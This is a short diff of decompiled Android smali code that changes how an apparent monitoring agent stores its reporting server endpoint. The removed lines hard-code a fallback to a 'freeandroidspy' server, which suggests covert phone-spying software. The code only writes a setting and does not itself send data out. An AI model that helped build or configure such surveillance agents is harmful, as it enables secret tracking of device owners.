@@ -183,7 +183,7 @@
 .end method
 
 .method public static setEndpoint(Landroid/content/Context;Ljava/lang/String;)V
-    .locals 3
+    .locals 4
 
     const-string v0, "system"
 
@@ -203,31 +203,33 @@
 
     move-result-object v0
 
-    const-string v1, "server_endpoint"
+    sget-object v1, Lcom/hp/vd/agent/Configuration;->PREF_KEY_ENDPOINT:Ljava/lang/String;
 
     if-eqz p1, :cond_1
 
-    invoke-virtual {p1}, Ljava/lang/String;->length()I
+    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;
 
-    move-result v2
+    move-result-object v2
 
-    if-lez v2, :cond_1
+    invoke-virtual {v2}, Ljava/lang/String;->length()I
 
-    move-object v2, p1
+    move-result v3
 
-    goto :goto_0
+    if-lez v3, :cond_1
 
-    :cond_1
-    const-string v2, "https://server.freeandroidspy.com:443/index.php"
-
-    :goto_0
     invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;
 
     move-result-object v0
 
-    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z
+    goto :goto_0
 
-    move-result v0
+    :cond_1
+    invoke-interface {v0, v1}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;
+
+    move-result-object v0
+
+    :goto_0
+    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V
 
     return-void
 .end method
